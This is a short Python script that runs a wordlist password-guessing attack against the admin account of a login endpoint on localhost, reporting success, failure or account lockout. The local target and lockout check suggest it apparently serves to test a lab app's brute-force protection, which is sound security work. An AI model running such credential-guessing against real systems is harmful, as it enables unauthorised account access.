import requests

url = "http://127.0.0.1:5000/login"
username = "admin"

with open("wordlist.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()

    response = requests.post(url, json={
        "username": username,
        "password": password
    })

    if response.status_code == 200:
        print(f"[SUCCESS] Password found: {password}")
        break
    elif response.status_code == 403:
        print("[LOCKED] Account locked after multiple attempts")
        break
    else:
        print(f"[FAILED] Tried password: {password}")
